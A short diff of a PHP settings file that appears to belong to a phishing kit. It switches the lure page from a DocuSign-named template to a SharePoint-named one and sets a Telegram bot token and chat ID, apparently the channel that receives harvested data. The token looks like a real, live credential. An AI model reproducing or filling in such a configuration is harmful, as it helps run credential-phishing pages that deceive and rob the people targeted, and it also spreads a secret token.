@@ -7,6 +7,6 @@ $api_prefix = "eax7tzfy";
 $telegram_bot_token = "7250819218:AAFzaQLpYEIhrkOaRYJPEZOXmIIxfhDhB0g";
 $telegram_chat_id = "6040470374";
 
-$page_name = "docusign_1";
+$page_name = "sharepoint_1";
 
 ?>
